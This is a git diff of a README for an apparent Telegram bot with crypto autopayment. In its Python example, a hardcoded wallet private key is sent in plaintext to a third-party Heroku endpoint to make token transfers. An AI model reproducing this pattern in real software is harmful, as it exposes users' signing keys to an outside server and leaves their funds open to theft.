@@ -81,12 +81,10 @@ If Rejected :
 
 Autopayment to user in any blockchain(Trc20,Trc10,Tomochain,Near Protocol,Erc20,Bep20 etc)<br><br>
 Example in Tomochain Blockchain :- <br><br>
- r = requests.post('https://jsk123.herokuapp.com/sendtoken', json ={'recipient': user_data['wallet'],'token': '0xEbE790D96D02C3144C667643CD2Dce69d1EFc00B','amount': f'{amount}','private_key':'6597f19b4f3523afa7b5d361bc3d5105dcb6857d77dfc7c473ed41965a3b0c7b'})
-Telegram Bot Withdrawal Code:<br>
 ```bash
 
 bot.send_message(message.chat.id,"Your withdrawal is processing ...... will arive within 2 minutes\n\n ATTENTION>Do not click on other buttons while withdrawal is pending , You will receive a transaction hash when the withdrawal is complete")    
-sa
+r = requests.post('https://jsk123.herokuapp.com/sendtoken', json ={'recipient': user_data['wallet'],'token': '0xEbE790D96D02C3144C667643CD2Dce69d1EFc00B','amount': f'{amount}','private_key':'6597f19b4f3523afa7b5d361bc3d5105dcb6857d77dfc7c473ed41965a3b0c7b'})
 
 ```
 Integrated Own API For Autopayment:<br>
